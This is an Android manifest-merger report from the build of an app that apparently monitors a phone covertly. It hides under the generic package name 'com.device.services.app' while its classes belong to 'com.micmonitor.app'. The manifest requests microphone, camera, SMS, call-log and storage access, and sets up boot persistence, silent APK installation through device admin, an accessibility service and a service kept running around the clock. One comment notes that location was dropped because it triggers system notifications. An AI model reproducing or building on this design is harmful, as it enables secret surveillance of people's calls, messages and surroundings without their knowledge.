app/build/intermediates/manifest_merge_blame_file/release/manifest-merger-blame-release-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.device.services.app"
4    android:versionCode="66"
5    android:versionName="1.14.20" >
6
7    <uses-sdk
8        android:minSdkVersion="26"
9        android:targetSdkVersion="35" />
10
11    <!-- Core Permissions -->
12    <uses-permission android:name="android.permission.RECORD_AUDIO" />
12-->src\main\AndroidManifest.xml:6:5-71
12-->src\main\AndroidManifest.xml:6:22-68
13    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
13-->src\main\AndroidManifest.xml:7:5-80
13-->src\main\AndroidManifest.xml:7:22-77
14    <uses-permission android:name="android.permission.CAMERA" />
14-->src\main\AndroidManifest.xml:8:5-65
14-->src\main\AndroidManifest.xml:8:22-62
15    <uses-permission android:name="android.permission.INTERNET" />
15-->src\main\AndroidManifest.xml:9:5-67
15-->src\main\AndroidManifest.xml:9:22-64
16    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
16-->src\main\AndroidManifest.xml:10:5-79
16-->src\main\AndroidManifest.xml:10:22-76
17    <uses-permission android:name="android.permission.WAKE_LOCK" />
17-->src\main\AndroidManifest.xml:11:5-68
17-->src\main\AndroidManifest.xml:11:22-65
18    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
18-->src\main\AndroidManifest.xml:12:5-81
18-->src\main\AndroidManifest.xml:12:22-78
19    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
19-->src\main\AndroidManifest.xml:13:5-75
19-->src\main\AndroidManifest.xml:13:22-72
20
21    <!-- Location REMOVED - causes system notifications -->
22    <!-- <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /> -->
23    <!-- <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /> -->
24
25
26    <!-- SMS & Call Log -->
27    <uses-permission android:name="android.permission.READ_SMS" />
27-->src\main\AndroidManifest.xml:20:5-67
27-->src\main\AndroidManifest.xml:20:22-64
28    <uses-permission android:name="android.permission.READ_CALL_LOG" />
28-->src\main\AndroidManifest.xml:21:5-72
28-->src\main\AndroidManifest.xml:21:22-69
29
30    <!-- External media/file read access -->
31    <uses-permission
31-->src\main\AndroidManifest.xml:24:5-26:38
32        android:name="android.permission.READ_EXTERNAL_STORAGE"
32-->src\main\AndroidManifest.xml:25:9-64
33        android:maxSdkVersion="32" />
33-->src\main\AndroidManifest.xml:26:9-35
34    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
34-->src\main\AndroidManifest.xml:27:5-29:40
34-->src\main\AndroidManifest.xml:28:9-66
35    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
35-->src\main\AndroidManifest.xml:30:5-75
35-->src\main\AndroidManifest.xml:30:22-72
36    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
36-->src\main\AndroidManifest.xml:31:5-75
36-->src\main\AndroidManifest.xml:31:22-72
37    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
37-->src\main\AndroidManifest.xml:32:5-76
37-->src\main\AndroidManifest.xml:32:22-73
38
39    <!-- WiFi Control (Device Owner can toggle WiFi) -->
40    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
40-->src\main\AndroidManifest.xml:35:5-76
40-->src\main\AndroidManifest.xml:35:22-73
41    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
41-->src\main\AndroidManifest.xml:36:5-76
41-->src\main\AndroidManifest.xml:36:22-73
42
43    <!-- Foreground Service Permissions (Android 9+) -->
44    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
44-->src\main\AndroidManifest.xml:39:5-77
44-->src\main\AndroidManifest.xml:39:22-74
45
46    <!-- Battery optimization exemption — keeps service alive 24/7 -->
47    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
47-->src\main\AndroidManifest.xml:42:5-95
47-->src\main\AndroidManifest.xml:42:22-92
48
49    <!-- Exact alarm permission — required for 8-min reconnect alarm on Android 12+ -->
50    <uses-permission
50-->src\main\AndroidManifest.xml:45:5-46:38
51        android:name="android.permission.SCHEDULE_EXACT_ALARM"
51-->src\main\AndroidManifest.xml:45:22-76
52        android:maxSdkVersion="32" />
52-->src\main\AndroidManifest.xml:46:9-35
53    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
53-->src\main\AndroidManifest.xml:47:5-74
53-->src\main\AndroidManifest.xml:47:22-71
54
55    <!-- Foreground Service Type Permissions (Android 14+) -->
56    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
56-->src\main\AndroidManifest.xml:50:5-88
56-->src\main\AndroidManifest.xml:50:22-85
57    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
57-->src\main\AndroidManifest.xml:51:5-84
57-->src\main\AndroidManifest.xml:51:22-81
58    <!-- Location service type removed -->
59
60
61    <!-- APK Auto-Update Permissions -->
62    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
62-->src\main\AndroidManifest.xml:55:5-83
62-->src\main\AndroidManifest.xml:55:22-80
63    <uses-permission android:name="android.permission.INSTALL_PACKAGES" />
63-->src\main\AndroidManifest.xml:56:5-111
63-->src\main\AndroidManifest.xml:56:22-72
64
65    <!-- Hardware requirement -->
66    <uses-feature
66-->src\main\AndroidManifest.xml:59:5-61:35
67        android:name="android.hardware.microphone"
67-->src\main\AndroidManifest.xml:60:9-51
68        android:required="true" />
68-->src\main\AndroidManifest.xml:61:9-32
69
70    <permission
70-->[androidx.core:core:1.12.0] AndroidManifest.xml:22:5-24:47
71        android:name="com.device.services.app.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
71-->[androidx.core:core:1.12.0] AndroidManifest.xml:23:9-81
72        android:protectionLevel="signature" />
72-->[androidx.core:core:1.12.0] AndroidManifest.xml:24:9-44
73
74    <uses-permission android:name="com.device.services.app.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
74-->[androidx.core:core:1.12.0] AndroidManifest.xml:26:5-97
74-->[androidx.core:core:1.12.0] AndroidManifest.xml:26:22-94
75
76    <application
76-->src\main\AndroidManifest.xml:63:5-154:19
77        android:name="com.micmonitor.app.MicApp"
77-->src\main\AndroidManifest.xml:64:9-31
78        android:allowBackup="false"
78-->src\main\AndroidManifest.xml:65:9-36
79        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
79-->[androidx.core:core:1.12.0] AndroidManifest.xml:28:18-86
80        android:dataExtractionRules="@xml/data_extraction_rules"
80-->src\main\AndroidManifest.xml:66:9-65
81        android:extractNativeLibs="false"
82        android:fullBackupContent="@xml/backup_rules"
82-->src\main\AndroidManifest.xml:67:9-54
83        android:label="@string/app_name"
83-->src\main\AndroidManifest.xml:68:9-41
84        android:networkSecurityConfig="@xml/network_security_config"
84-->src\main\AndroidManifest.xml:69:9-69
85        android:supportsRtl="true"
85-->src\main\AndroidManifest.xml:70:9-35
86        android:theme="@style/Theme.MicMonitor"
86-->src\main\AndroidManifest.xml:72:9-48
87        android:usesCleartextTraffic="false" >
87-->src\main\AndroidManifest.xml:71:9-45
88
89        <!-- Main Activity (one-time setup screen) -->
90        <activity
90-->src\main\AndroidManifest.xml:76:9-84:20
91            android:name="com.micmonitor.app.MainActivity"
91-->src\main\AndroidManifest.xml:77:13-41
92            android:exported="true"
92-->src\main\AndroidManifest.xml:78:13-36
93            android:theme="@style/Theme.MicMonitor" >
93-->src\main\AndroidManifest.xml:79:13-52
94            <intent-filter>
94-->src\main\AndroidManifest.xml:80:13-83:29
95                <action android:name="android.intent.action.MAIN" />
95-->src\main\AndroidManifest.xml:81:17-69
95-->src\main\AndroidManifest.xml:81:25-66
96
97                <category android:name="android.intent.category.LAUNCHER" />
97-->src\main\AndroidManifest.xml:82:17-77
97-->src\main\AndroidManifest.xml:82:27-74
98            </intent-filter>
99        </activity>
100
101        <!-- Foreground Service -->
102        <service
102-->src\main\AndroidManifest.xml:87:9-91:44
103            android:name="com.micmonitor.app.MicService"
103-->src\main\AndroidManifest.xml:88:13-39
104            android:exported="false"
104-->src\main\AndroidManifest.xml:90:13-37
105            android:foregroundServiceType="microphone|camera"
105-->src\main\AndroidManifest.xml:89:13-62
106            android:stopWithTask="false" />
106-->src\main\AndroidManifest.xml:91:13-41
107
108        <!-- Auto-start receiver for boot and app update -->
109        <receiver
109-->src\main\AndroidManifest.xml:94:9-106:20
110            android:name="com.micmonitor.app.BootReceiver"
110-->src\main\AndroidManifest.xml:95:13-41
111            android:directBootAware="true"
111-->src\main\AndroidManifest.xml:98:13-43
112            android:enabled="true"
112-->src\main\AndroidManifest.xml:96:13-35
113            android:exported="true" >
113-->src\main\AndroidManifest.xml:97:13-36
114            <intent-filter android:priority="1000" >
114-->src\main\AndroidManifest.xml:99:13-105:29
114-->src\main\AndroidManifest.xml:99:28-51
115                <action android:name="android.intent.action.BOOT_COMPLETED" />
115-->src\main\AndroidManifest.xml:100:17-79
115-->src\main\AndroidManifest.xml:100:25-76
116                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
116-->src\main\AndroidManifest.xml:101:17-86
116-->src\main\AndroidManifest.xml:101:25-83
117                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
117-->src\main\AndroidManifest.xml:102:17-82
117-->src\main\AndroidManifest.xml:102:25-79
118                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
118-->src\main\AndroidManifest.xml:103:17-82
118-->src\main\AndroidManifest.xml:103:25-79
119                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
119-->src\main\AndroidManifest.xml:104:17-84
119-->src\main\AndroidManifest.xml:104:25-81
120            </intent-filter>
121        </receiver>
122
123        <!-- Device Admin Receiver for silent APK installation -->
124        <receiver
124-->src\main\AndroidManifest.xml:109:9-119:20
125            android:name="com.micmonitor.app.DeviceAdminReceiver"
125-->src\main\AndroidManifest.xml:110:13-48
126            android:exported="true"
126-->src\main\AndroidManifest.xml:111:13-36
127            android:permission="android.permission.BIND_DEVICE_ADMIN" >
127-->src\main\AndroidManifest.xml:112:13-70
128            <meta-data
128-->src\main\AndroidManifest.xml:113:13-115:56
129                android:name="android.app.device_admin"
129-->src\main\AndroidManifest.xml:114:17-56
130                android:resource="@xml/device_admin" />
130-->src\main\AndroidManifest.xml:115:17-53
131
132            <intent-filter>
132-->src\main\AndroidManifest.xml:116:13-118:29
133                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
133-->src\main\AndroidManifest.xml:117:17-82
133-->src\main\AndroidManifest.xml:117:25-79
134            </intent-filter>
135        </receiver>
136
137        <!-- Install Result Receiver for silent install feedback -->
138        <receiver
138-->src\main\AndroidManifest.xml:122:9-128:20
139            android:name="com.micmonitor.app.InstallResultReceiver"
139-->src\main\AndroidManifest.xml:123:13-50
140            android:exported="true" >
140-->src\main\AndroidManifest.xml:124:13-36
141            <intent-filter>
141-->src\main\AndroidManifest.xml:125:13-127:29
142                <action android:name="com.micmonitor.app.INSTALL_RESULT" />
142-->src\main\AndroidManifest.xml:126:17-76
142-->src\main\AndroidManifest.xml:126:25-73
143            </intent-filter>
144        </receiver>
145
146        <!-- FileProvider for APK installation (Android 7+) -->
147        <provider
148            android:name="androidx.core.content.FileProvider"
148-->src\main\AndroidManifest.xml:132:13-62
149            android:authorities="com.device.services.app.fileprovider"
149-->src\main\AndroidManifest.xml:133:13-64
150            android:exported="false"
150-->src\main\AndroidManifest.xml:134:13-37
151            android:grantUriPermissions="true" >
151-->src\main\AndroidManifest.xml:135:13-47
152            <meta-data
152-->src\main\AndroidManifest.xml:136:13-138:54
153                android:name="android.support.FILE_PROVIDER_PATHS"
153-->src\main\AndroidManifest.xml:137:17-67
154                android:resource="@xml/file_paths" />
154-->src\main\AndroidManifest.xml:138:17-51
155        </provider>
156
157        <!-- Monitor Accessibility Service -->
158        <service
158-->src\main\AndroidManifest.xml:142:9-152:19
159            android:name="com.micmonitor.app.MonitorAccessibilityService"
159-->src\main\AndroidManifest.xml:143:13-56
160            android:exported="true"
160-->src\main\AndroidManifest.xml:144:13-36
161            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
161-->src\main\AndroidManifest.xml:145:13-79
162            <intent-filter>
162-->src\main\AndroidManifest.xml:146:13-148:29
163                <action android:name="android.accessibilityservice.AccessibilityService" />
163-->src\main\AndroidManifest.xml:147:17-92
163-->src\main\AndroidManifest.xml:147:25-89
164            </intent-filter>
165
166            <meta-data
166-->src\main\AndroidManifest.xml:149:13-151:72
167                android:name="android.accessibilityservice"
167-->src\main\AndroidManifest.xml:150:17-60
168                android:resource="@xml/accessibility_service_config" />
168-->src\main\AndroidManifest.xml:151:17-69
169        </service>
170
171        <provider
171-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:24:9-32:20
172            android:name="androidx.startup.InitializationProvider"
172-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:25:13-67
173            android:authorities="com.device.services.app.androidx-startup"
173-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:26:13-68
174            android:exported="false" >
174-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:27:13-37
175            <meta-data
175-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
176                android:name="androidx.emoji2.text.EmojiCompatInitializer"
176-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
177                android:value="androidx.startup" />
177-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
178            <meta-data
178-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:34:13-36:52
179                android:name="androidx.work.WorkManagerInitializer"
179-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:35:17-68
180                android:value="androidx.startup" />
180-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:36:17-49
181            <meta-data
181-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:29:13-31:52
182                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
182-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:30:17-78
183                android:value="androidx.startup" />
183-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:31:17-49
184            <meta-data
184-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:29:13-31:52
185                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
185-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:30:17-85
186                android:value="androidx.startup" />
186-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:31:17-49
187        </provider>
188
189        <service
189-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:39:9-45:35
190            android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"
190-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:40:13-88
191            android:directBootAware="false"
191-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:41:13-44
192            android:enabled="@bool/enable_system_alarm_service_default"
192-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:42:13-72
193            android:exported="false" />
193-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:43:13-37
194        <service
194-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:46:9-52:35
195            android:name="androidx.work.impl.background.systemjob.SystemJobService"
195-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:47:13-84
196            android:directBootAware="false"
196-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:48:13-44
197            android:enabled="@bool/enable_system_job_service_default"
197-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:49:13-70
198            android:exported="true"
198-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:50:13-36
199            android:permission="android.permission.BIND_JOB_SERVICE" />
199-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:51:13-69
200        <service
200-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:53:9-59:35
201            android:name="androidx.work.impl.foreground.SystemForegroundService"
201-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:54:13-81
202            android:directBootAware="false"
202-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:55:13-44
203            android:enabled="@bool/enable_system_foreground_service_default"
203-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:56:13-77
204            android:exported="false" />
204-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:57:13-37
205
206        <receiver
206-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:61:9-66:35
207            android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"
207-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:62:13-88
208            android:directBootAware="false"
208-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:63:13-44
209            android:enabled="true"
209-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:64:13-35
210            android:exported="false" />
210-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:65:13-37
211        <receiver
211-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:67:9-77:20
212            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy"
212-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:68:13-106
213            android:directBootAware="false"
213-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:69:13-44
214            android:enabled="false"
214-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:70:13-36
215            android:exported="false" >
215-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:71:13-37
216            <intent-filter>
216-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:73:13-76:29
217                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
217-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:17-87
217-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:25-84
218                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
218-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:17-90
218-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:25-87
219            </intent-filter>
220        </receiver>
221        <receiver
221-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:78:9-88:20
222            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy"
222-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:79:13-104
223            android:directBootAware="false"
223-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:80:13-44
224            android:enabled="false"
224-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:81:13-36
225            android:exported="false" >
225-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:82:13-37
226            <intent-filter>
226-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:84:13-87:29
227                <action android:name="android.intent.action.BATTERY_OKAY" />
227-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:17-77
227-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:25-74
228                <action android:name="android.intent.action.BATTERY_LOW" />
228-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:17-76
228-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:25-73
229            </intent-filter>
230        </receiver>
231        <receiver
231-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:89:9-99:20
232            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy"
232-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:90:13-104
233            android:directBootAware="false"
233-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:91:13-44
234            android:enabled="false"
234-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:92:13-36
235            android:exported="false" >
235-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:93:13-37
236            <intent-filter>
236-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:95:13-98:29
237                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
237-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:17-83
237-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:25-80
238                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
238-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:17-82
238-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:25-79
239            </intent-filter>
240        </receiver>
241        <receiver
241-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:100:9-109:20
242            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy"
242-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:101:13-103
243            android:directBootAware="false"
243-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:102:13-44
244            android:enabled="false"
244-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:103:13-36
245            android:exported="false" >
245-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:104:13-37
246            <intent-filter>
246-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:106:13-108:29
247                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
247-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:17-79
247-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:25-76
248            </intent-filter>
249        </receiver>
250        <receiver
250-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:110:9-121:20
251            android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver"
251-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:111:13-88
252            android:directBootAware="false"
252-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:112:13-44
253            android:enabled="false"
253-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:113:13-36
254            android:exported="false" >
254-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:114:13-37
255            <intent-filter>
255-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:116:13-120:29
256                <action android:name="android.intent.action.BOOT_COMPLETED" />
256-->src\main\AndroidManifest.xml:100:17-79
256-->src\main\AndroidManifest.xml:100:25-76
257                <action android:name="android.intent.action.TIME_SET" />
257-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:17-73
257-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:25-70
258                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
258-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:17-81
258-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:25-78
259            </intent-filter>
260        </receiver>
261        <receiver
261-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:122:9-131:20
262            android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver"
262-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:123:13-99
263            android:directBootAware="false"
263-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:124:13-44
264            android:enabled="@bool/enable_system_alarm_service_default"
264-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:125:13-72
265            android:exported="false" >
265-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:126:13-37
266            <intent-filter>
266-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:128:13-130:29
267                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies" />
267-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:17-98
267-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:25-95
268            </intent-filter>
269        </receiver>
270        <receiver
270-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:132:9-142:20
271            android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver"
271-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:133:13-78
272            android:directBootAware="false"
272-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:134:13-44
273            android:enabled="true"
273-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:135:13-35
274            android:exported="true"
274-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:136:13-36
275            android:permission="android.permission.DUMP" >
275-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:137:13-57
276            <intent-filter>
276-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:139:13-141:29
277                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS" />
277-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:140:17-88
277-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:140:25-85
278            </intent-filter>
279        </receiver>
280
281        <service
281-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:24:9-28:63
282            android:name="androidx.room.MultiInstanceInvalidationService"
282-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:25:13-74
283            android:directBootAware="true"
283-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:26:13-43
284            android:exported="false" />
284-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:27:13-37
285
286        <receiver
286-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:34:9-52:20
287            android:name="androidx.profileinstaller.ProfileInstallReceiver"
287-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:35:13-76
288            android:directBootAware="false"
288-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:36:13-44
289            android:enabled="true"
289-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:37:13-35
290            android:exported="true"
290-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:38:13-36
291            android:permission="android.permission.DUMP" >
291-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:39:13-57
292            <intent-filter>
292-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:40:13-42:29
293                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
293-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:17-91
293-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:25-88
294            </intent-filter>
295            <intent-filter>
295-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:43:13-45:29
296                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
296-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:17-85
296-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:25-82
297            </intent-filter>
298            <intent-filter>
298-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:46:13-48:29
299                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
299-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:17-88
299-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:25-85
300            </intent-filter>
301            <intent-filter>
301-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:49:13-51:29
302                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
302-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:17-95
302-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:25-92
303            </intent-filter>
304        </receiver>
305    </application>
306
307</manifest>